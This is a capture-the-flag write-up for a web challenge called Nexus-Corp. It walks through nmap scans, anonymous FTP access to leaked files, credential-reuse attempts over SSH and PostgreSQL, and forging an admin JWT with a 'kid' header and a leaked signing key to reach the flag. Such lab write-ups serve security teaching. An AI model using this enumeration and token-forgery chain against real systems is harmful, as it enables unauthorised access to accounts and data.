+++
title = 'Nexus-Corp'
description = "You've gained a foothold on Nexus Corp's internal network. Enumerate the host and get access to the `/admin` endpoint where the flag resides."
category = 'Web'
solved = true
+++

| Info        	|                                        	|
|-------------	|----------------------------------------	|
| Category    	| {{< param category >}}                 	|
| Description 	| {{< desc >}}                           	|
| Endpoint    	| `15.223.25.67:3000`                    	|
| Flag        	| `HFCTF{spr4y_1d0r_f0rg3ry_fu1l_chain}` 	|

## Summary

We are met with a login page and no information about any user.
Following the description of the challenge, we enumerate the host and find a FTP service where we can get files about employees and details about the JWTs used on the page.
Forging a new token we login and find a dashboard page with javascript code to read the token.
We modify the token further and are not logged in as the admin, giving us access to the admin page and the flag.

## Finding the Flag

First things first, trying the `/admin` endpoit returns a 401 Unauthorized.
The given endpoint returned a login page with nothing interesting in the source code.

### Enumeration
So I followed the advice of the description and enumarated the host using `nmap`.

```console
$ nmap 15.223.25.67
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-29 19:37 -0400
Nmap scan report for ec2-15-223-25-67.ca-central-1.compute.amazonaws.com (15.223.25.67)
Host is up (0.017s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
443/tcp   closed https
2222/tcp  open   EtherNetIP-1
3000/tcp  open   ppp
8080/tcp  open   http-proxy
30000/tcp closed ndmps

Nmap done: 1 IP address (1 host up) scanned in 4.48 seconds
```

> [!NOTE]
> The port `8080` was used by another challenge, so nothing there for this one.

Obviously, the port `3000` is a web server, since I had accessed it earlier.
But I wanted to know if maybe the vulnerability was in the specific service used.

```console
$ nmap -sV -sC -p 3000 15.223.25.67
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-29 19:21 -0400
Nmap scan report for ec2-15-223-25-67.ca-central-1.compute.amazonaws.com (15.223.25.67)
Host is up (0.010s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Nexus Corp - Login
```
### FTP
The FTP server was also interesting.
Maybe it was left as `anonymous`, so I connected to it with a simple `ftp 15.223.25.67` and believe it or not, the `anonymous` user was working.
On the server were 4 files about IT and Onboarding, so I downloaded them all to check them.

#### IT

- File `dev-todo.txt`:
```text { hl_lines=[11,13,14] }
IT Development Team - TODO List
================================
Last Updated: 2024-01-12

[ ] Migrate user database to new PostgreSQL cluster
[ ] Update SSL certificates for internal services
[ ] Fix VPN timeout issues for remote workers
[ ] Schedule downtime for firewall maintenance

[X] Migrate JWT signing to file-based key system
[X] Update API endpoints to use kid header

[!!!] URGENT: Delete /app/jwt-keys/old
    - This file contains the OLD JWT signing key: n3xus_c0rp_s3cr3t_k3y_2024!
    - Key can be easily guessed from naming pattern
    - Must be removed before security audit on Friday
    - assigned to: devops@nexuscorp.local

================================
Contact: devteam@nexuscorp.local
```

- File `IT-Config-Backup.json`:
```json { hl_lines=["7-13",16,21] }
{
  "app": {
    "name": "Nexus Corp HR Portal",
    "version": "2.4.1",
    "port": 3000
  },
  "database": {
    "host": "localhost",
    "port": 5432,
    "name": "hr_portal",
    "user": "hr_admin",
    "password": "Hr@dm1n2024!"
  },
  "jwt": {
    "expires_in": "24h",
    "algorithm": "HS256",
	"key_rotation_enabled": true,
    "key_file": "/app/jwt-keys/current"
  },
  "session": {
    "cookie_name": "nexus_session",
    "secure": false,
    "http_only": false
  },
  "backup_info": {
    "last_backup": "2024-01-15T03:00:00Z",
    "backup_location": "/var/backups/hr_portal",
    "retention_days": 30
  }
}
```

#### Onboarding

- File `HR-Employee-List.csv`:
```csv { hl_lines=[2] }
employee_id,first_name,last_name,department,role,email
1001,Admin,User,IT,admin,admin@nexuscorp.local
1002,James,Mitchell,Executive,employee,james.mitchell@nexuscorp.local
1003,Sarah,Johnson,HR,employee,sarah.johnson@nexuscorp.local
1004,Michael,Wilson,Finance,employee,michael.wilson@nexuscorp.local
1005,Emily,Chen,Engineering,employee,emily.chen@nexuscorp.local
1006,Robert,Lee,Sales,employee,robert.lee@nexuscorp.local
1007,Jennifer,Garcia,Marketing,employee,jennifer.garcia@nexuscorp.local
1008,David,Park,Engineering,employee,david.park@nexuscorp.local
1009,Lisa,Anderson,HR,employee,lisa.anderson@nexuscorp.local
1010,Chris,Taylor,Sales,employee,chris.taylor@nexuscorp.local
1011,Amanda,Brown,Finance,employee,amanda.brown@nexuscorp.local
1012,Matthew,Evans,Engineering,employee,matthew.evans@nexuscorp.local
```

- File `IT-Onboarding-Guide.txt`:
```text
Nexus Corp - IT Onboarding Guide
=================================
Version 2.1 - Internal Use Only

1. ACCOUNT CREATION
   When creating accounts for new employees, use the following format:
   
   Username format: first initial + last name (all lowercase)
   Examples:
     - John Smith    → jsmith
     - Sarah Johnson → sjohnson
     - Mike Wilson   → mwilson
     - Emily Chen    → echen
     - David Park    → dpark
   
   For employees with common names, a number may be appended:
     - john.smith → jsmith2

2. DEFAULT PASSWORD
   All new accounts are created with the default password:
   Nexus$2024!
   
   Employees must change their password on first login.
   Password policy: minimum 12 characters, must include uppercase, 
   lowercase, number, and special character.

3. ACCESS LEVELS
   - Employee: Basic HR portal access
   - Manager: Team management features
   - Admin: Full system access (IT department only)

4. SUPPORT
   Contact IT Help Desk: helpdesk@nexuscorp.local
   Emergency: ext. 5555

NOTE: This document is classified as INTERNAL. Do not share outside 
the organization.
```

### PostgreSQL
The first thing that jumped to my mind was the database mentionned in lines 7-13 of the backup `json` file.
The port `5432` is usually reserved for PostgreSQL, so I confirmed it quickly.

```console
$ nmap -sV -sC -p 5432 15.223.25.67
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-29 19:46 -0400
Nmap scan report for ec2-15-223-25-67.ca-central-1.compute.amazonaws.com (15.223.25.67)
Host is up (0.047s latency).

PORT     STATE    SERVICE    VERSION
5432/tcp filtered postgresql

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.25 second
```

As clearly indicated by the backup file and hinted by the `filtered` state of the port, the database was only accessible locally.
I realized this after running 
```console
$ psql -h 15.223.25.67 -p 5432 -U hr_admin -d hr_portal -W
```
to try and connect to the database with no success.

### SSH 
Maybe I could try and connect using SSH to the machine and find more info about the flag.
After all, there was at least one SSH port open. 

```console
$ ssh 15.223.25.67                       
The authenticity of host '15.223.25.67 (15.223.25.67)' can't be established.
ED25519 key fingerprint is: SHA256:HH1QDDdtMs2if+iX1+krJ9n1MSjSi1YUOp3y5YVCIq4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '15.223.25.67' (ED25519) to the list of known hosts.
kali@15.223.25.67: Permission denied (publickey).
```

The opened port `22` needed a public key, so no chance of connection there. 
There was another SSH port opened on the machine, though.
Being curious of what `EtherNetIP-1` is supposed to be, I scanned the port `2222`, and obviously it was just another SSH service.

```console
$ nmap -sV -sC -p 2222 15.223.25.67
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-29 19:55 -0400
Nmap scan report for ec2-15-223-25-67.ca-central-1.compute.amazonaws.com (15.223.25.67)
Host is up (0.012s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:34:45:4d:86:c1:31:f9:55:27:c0:48:76:43:be:8a (ECDSA)
|_  256 f6:21:73:16:c8:5f:c7:fc:10:01:3f:5e:f2:1d:a1:49 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.72 seconds
```

This one needed a password and not a public key, but after trying the passwords found in the backup and onboarding guide in line 21 combined with the username format of line 8 and employees of the list, I had no success.

> [!NOTE]
> I did also try to just connect to the login page using the username format and default password, to no success here either.

### The Session Cookie

I added the cookie from line 21 of the backup file to value `admin` to try and maybe get a valid connection.
It did manage to get me to the `/dashboard` page, where I found this code in the source:

```html { hl_lines=[4,"11-15","21-23",26] }
<script>
        let myData = null;

        async function loadProfile() {
            const cookies = document.cookie.split(';').reduce((acc, c) => {
                const [k, ...v] = c.trim().split('=');
                acc[k] = v.join('=');
                return acc;
            }, {});

            const token = cookies.nexus_session;
            if (!token) {
                window.location.href = '/';
                return;
            }

            try {
                const payload = JSON.parse(atob(token.split('.')[1]));
                myData = payload;

                if (payload.role === 'admin') {
                    document.getElementById('admin-link').style.display = 'inline';
                }

                // Fetch our profile
                const res = await fetch(`/api/employee/${payload.employee_id}`);
                const emp = await res.json();

                document.getElementById('my-profile').innerHTML = `
                    <div class="info-item"><label>Employee ID</label><span>${emp.id}</span></div>
                    <div class="info-item"><label>Name</label><span>${emp.first_name} ${emp.last_name}</span></div>
                    <div class="info-item"><label>Department</label><span>${emp.department}</span></div>
                    <div class="info-item"><label>Email</label><span>${emp.email}</span></div>
                    <div class="info-item"><label>Role</label><span>${emp.role}</span></div>
                    <div class="info-item"><label>Hire Date</label><span>${emp.hire_date}</span></div>
                `;

                // Load team data
                loadTeamActivity();
            } catch (e) {
                console.error('Failed to load profile:', e);
            }
        }

        async function loadTeamActivity() {
            try {
                const res = await fetch('/api/team/activity');
                const data = await res.json();

                // Render activity
                document.getElementById('team-activity').innerHTML = data.recent_activity.map(a => `
                    <div class="activity-item">
                        <span class="action">${a.action}</span>
                        <span class="time">${a.time}</span>
                    </div>
                `).join('');

                // Render colleagues with view buttons
                document.getElementById('colleagues-list').innerHTML = data.colleagues.map(c => `
                    <div class="colleague-row">
                        <div class="colleague-info">
                            <span class="colleague-name">${c.name}</span>
                            <span class="colleague-role">${c.role} • ${c.email}</span>
                        </div>
                        <button class="view-btn" onclick="viewProfile(${c.id})">View Profile</button>
                    </div>
                `).join('');
            } catch (e) {
                console.error('Failed to load team activity:', e);
            }
        }

        async function viewProfile(id) {
            // VULN: IDOR - player can modify this ID in DevTools/intercept
            const res = await fetch(`/api/employee/${id}`);
            if (res.ok) {
                const emp = await res.json();
                document.getElementById('detail-panel').style.display = 'block';
                document.getElementById('detail-content').innerHTML = `
                    <div class="info-grid">
                        <div class="info-item"><label>Employee ID</label><span>${emp.id}</span></div>
                        <div class="info-item"><label>Name</label><span>${emp.first_name} ${emp.last_name}</span></div>
                        <div class="info-item"><label>Department</label><span>${emp.department}</span></div>
                        <div class="info-item"><label>Email</label><span>${emp.email}</span></div>
                        <div class="info-item"><label>Role</label><span>${emp.role}</span></div>
                        <div class="info-item"><label>Salary</label><span>$${emp.salary?.toLocaleString()}</span></div>
                        <div class="info-item"><label>SSN</label><span>${emp.ssn}</span></div>
                        <div class="info-item"><label>Hire Date</label><span>${emp.hire_date}</span></div>
                    </div>
                `;

                // Scroll to detail panel
                document.getElementById('detail-panel').scrollIntoView({ behavior: 'smooth' });
            }
        }

        loadProfile();
    </script>
```

The function `loadProfile` from line 4 is called on line 97, so let's start with it.
It seems from line 12 that having any value in the `nexus_session` cookie would let us access the dashboard page.
However, the rest of the dashboard was empty due to not having a valid `employee_id` to fetch the correct information (line 26).
I needed to forge a valid JWT token first, then add the admin role as specified in lines 21-23.

> [!warning]
> The comment on line 74 was another detour.
> Being able to access the employee by changing the ID in the network tab and resending the request would reveal nothing useful that I did not already have in the files found in the FTP dump.

From line 16 of the backup I knew the algorithm, and from line 14 of the todo file I knew the signing key.
I tried using this token:
```json
{
  "alg": "HS256",
  "typ": "JWT",
}
{
  "role": "admin",
  "employee_id": 1001
}
n3xus_c0rp_s3cr3t_k3y_2024!
```

It did not work at first.
What I had missed was line 11 et 13 of the todo file.
The token needed the `kid` header.

> [!TIP] The `kid` Header
> Since the JWT signing was moved to a file-based key system as mentionned on line 10, it meant that the token needed to mention which key was used.
> The server had now an old signing key from line 13 and 14 of the todo file, and a new one mentionned on line 18 of the backup file.
>
> The [`kid` header](https://www.rfc-editor.org/info/rfc7515/#section-4.1.4) is an optional header used to indicate which key was used when signing the token.

I reforged the token using
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "old"
}
{
  "role": "admin",
  "employee_id": 1001
}
n3xus_c0rp_s3cr3t_k3y_2024!
```
with the `employee_id` of the admin found in the `csv` file.
Not only did it add the link to the `/admin` page, but I was also authorized because I was the correct employee.
Following the link gave me the flag.
